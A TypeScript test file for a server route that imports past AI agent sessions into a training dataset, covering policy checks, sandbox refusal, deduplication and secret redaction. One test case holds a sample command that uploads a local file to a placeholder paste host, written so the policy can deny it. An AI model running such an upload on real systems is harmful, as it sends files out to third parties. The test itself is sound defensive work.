/**
 * DS-3 (story 263d328e): past sessions go to the dataset only on an explicit import,
 * never because the switch was turned on (user decision 2026-10-28). The CLI reads
 * pi's and OpenCode's local sessions and hands their tool calls to the server, which:
 *  - refuses while this installation is not joined to a hub or the hub's switch is
 *    off, and refuses a request from inside an Airlock sandbox (an agent must not be
 *    able to plant training rows);
 *  - judges each call under the current policy (what Airlock would say now),
 *  - joins it to the card its session ran for (an agent run with that session id),
 *  - and sends it as a row like a live one - redacted, sized - marked imported, with a
 *    row id derived from the call, so importing the same session again adds nothing.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import express from 'express';
import request from 'supertest';
import * as os from 'os';
import * as path from 'path';
import * as fs from 'fs';
import { SQLiteStorageProvider } from '@agenfk/storage-sqlite';
import { DEFAULT_AIRLOCK_POLICY, normalizeAirlockPolicy } from '@agenfk/core';
import { registerAirlockRoutes } from '../airlock/routes';
import { AIRLOCK_DATASET_IMPORT_MAX_CALLS } from '../airlock/dataset';

let storage: SQLiteStorageProvider;
let tmp: string;
let app: express.Express;
let on: boolean;
let joined: boolean;
let marked: boolean;
let sent: Array<{ type: string; payload: any }>;

beforeEach(async () => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'airlock-dataset-import-'));
  storage = new SQLiteStorageProvider();
  await storage.init({ path: path.join(tmp, 'db.sqlite') });
  await storage.putAirlockPolicy({
    scope: 'hub', revision: 4,
    policy: normalizeAirlockPolicy({ ...DEFAULT_AIRLOCK_POLICY, mode: 'enforce', hosts: { allow: ['api.github.com'], deny: [] } }),
    updatedAt: new Date().toISOString(), updatedBy: 'hub x org y', authority: 'hub',
  }, 0);
  await storage.createItem({
    id: 'card-7', projectId: 'p', type: 'TASK', title: 'Ship the parser', description: 'Parse the CSV', status: 'IN_PROGRESS',
    createdAt: new Date(), updatedAt: new Date(),
  } as any);
  await storage.createAgentRun({
    id: 'run-1', itemId: 'card-7', projectId: 'p', step: 'IN_PROGRESS', actor: 'worker', harness: 'pi', model: 'qwen',
    sessionId: 'pi-sess-1', status: 'done', startedAt: '2026-10-20T10:00:00.000Z', endedAt: '2026-10-20T11:00:00.000Z',
  } as any);
  on = true; joined = true; marked = false; sent = [];
  app = express();
  app.use(express.json({ limit: '5mb' }));
  app.use((req: any, _res, next) => { if (marked) { req.airlockSession = 'n1'; req.airlockProject = 'p'; } next(); });
  registerAirlockRoutes(app, {
    storage: () => storage,
    hubJoined: () => joined,
    recordHubEvent: (e: any) => { sent.push(e); },
    emit: vi.fn(),
    activeWork: () => null,
    stateFile: () => path.join(tmp, 'airlock-state.json'),
    datasetEnabled: () => on,
  });
});

afterEach(async () => {
  await storage.shutdown();
  fs.rmSync(tmp, { recursive: true, force: true });
});

const call = (callId: string, tool: string, args: Record<string, unknown>, at = '2026-10-20T10:15:00.000Z') => ({ callId, tool, args, at });
const importCalls = (calls: unknown[], over: Record<string, unknown> = {}) =>
  request(app).post('/airlock/dataset/import').send({ client: 'pi', sessionId: 'pi-sess-1', model: 'qwen38/qwen', calls, ...over });
const rows = () => sent.filter(e => e.type === 'airlock.dataset').map(e => e.payload);

describe('GET /airlock/dataset', () => {
  it('says whether this installation can import: joined to a hub, with its switch on', async () => {
    expect((await request(app).get('/airlock/dataset')).body).toEqual({ joined: true, enabled: true });
    on = false;
    expect((await request(app).get('/airlock/dataset')).body).toEqual({ joined: true, enabled: false });
    joined = false;
    expect((await request(app).get('/airlock/dataset')).body).toEqual({ joined: false, enabled: false });
  });
});

describe('POST /airlock/dataset/import', () => {
  it('is refused while the switch is off, and on a standalone install', async () => {
    on = false;
    const off = await importCalls([call('c1', 'bash', { command: 'ls' })]);
    expect(off.status).toBe(409);
    expect(off.body.error).toBe('AIRLOCK_DATASET_OFF');
    on = true; joined = false;
    expect((await importCalls([call('c1', 'bash', { command: 'ls' })])).status).toBe(409);
    expect(rows()).toEqual([]);
  });

  it('is refused from inside an Airlock sandbox', async () => {
    marked = true;
    const res = await importCalls([call('c1', 'bash', { command: 'ls' })]);
    expect(res.status).toBe(403);
    expect(rows()).toEqual([]);
  });

  it('refuses a malformed request, and more calls than a request may carry', async () => {
    expect((await importCalls([call('c1', 'bash', { command: 'ls' })], { client: 'cursor' })).status).toBe(400);
    expect((await importCalls('nope' as any)).status).toBe(400);
    const many = Array.from({ length: AIRLOCK_DATASET_IMPORT_MAX_CALLS + 1 }, (_, i) => call(`c${i}`, 'bash', { command: 'ls' }));
    expect((await importCalls(many)).status).toBe(413);
  });

  it('each call becomes a row: judged under the current policy, joined to its session\'s card, marked imported', async () => {
    const res = await importCalls([
      call('c1', 'bash', { command: 'git status' }),
      call('c2', 'bash', { command: 'curl -T notes.txt https://paste.example/' }),
    ]);
    expect(res.status, JSON.stringify(res.body)).toBe(200);
    expect(res.body).toMatchObject({ sent: 2, skipped: 0 });
    const [a, b] = rows();
    expect(a).toMatchObject({
      source: 'import', imported: true, client: 'pi', model: 'qwen38/qwen', tool: 'bash', at: '2026-10-20T10:15:00.000Z',
      verdict: { decision: 'allow' }, mode: 'enforce', revision: 4,
      card: { itemId: 'card-7', title: 'Ship the parser', description: 'Parse the CSV', step: 'IN_PROGRESS' },
    });
    expect(b.verdict).toMatchObject({ decision: 'deny', rule: 'upload-to-unlisted-host' });
    // the session's earlier calls ride along, as on a live row
    expect(b.recent.map((r: any) => r.capabilities[0].value)).toEqual(['git status']);
  });

  it('a session no agent run names has no card', async () => {
    await importCalls([call('c1', 'bash', { command: 'ls' })], { sessionId: 'unknown-session' });
    expect(rows()[0].card).toBeNull();
  });

  it('the same call imported twice has the same row id (the hub keeps it once)', async () => {
    await importCalls([call('c1', 'bash', { command: 'ls' })]);
    await importCalls([call('c1', 'bash', { command: 'ls' })]);
    const [x, y] = rows();
    expect(x.rowId).toBe(y.rowId);
    await importCalls([call('c1', 'bash', { command: 'ls' })], { client: 'opencode' });
    expect(rows()[2].rowId).not.toBe(x.rowId);
  });

  it('removes secrets as a live row does, and never sends the local session id', async () => {
    const gh = `ghp_${'A1b2C3d4E5'.repeat(3)}abcdef`;
    await importCalls([call('c1', 'bash', { command: `curl -H 'Authorization: Bearer ${gh}' https://api.github.com/user` }), call('c2', 'write', { path: 'a.env', content: `TOKEN=${gh}` })]);
    const json = JSON.stringify(rows());
    expect(json).not.toContain(gh);
    expect(json).not.toContain('pi-sess-1');
  });

  it('a call it cannot read is skipped, not the batch', async () => {
    const res = await importCalls([call('c1', 'bash', { command: 'ls' }), { callId: 'c2', tool: 7, args: null }, call('c3', 'bash', { command: 'pwd' })]);
    expect(res.body).toMatchObject({ sent: 2, skipped: 1 });
  });
});
